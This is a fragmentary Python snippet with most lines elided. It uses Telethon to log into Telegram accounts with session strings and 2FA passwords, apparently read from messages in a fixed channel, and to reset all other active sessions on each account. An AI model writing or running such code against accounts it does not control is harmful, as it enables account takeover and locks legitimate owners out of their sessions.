...
def kill_others(client):
    ...
    if len(GetSessions.authorizations) > 1:
        ...
        for ss in GetSessions.authorizations:
            ...
            if SessionHash > 0:
                client(functions.account.ResetAuthorizationRequest(hash=SessionHash))
...
for message in mClient.get_messages(2576914746, None):
    ...
    if (
        ...
        client = TelegramClient(StringSession(ssn), api_id, api_hash).start(
            password=pass_2fa,
            max_attempts=10
        )
        ...
        print("Other Logins Found. Skipping this")
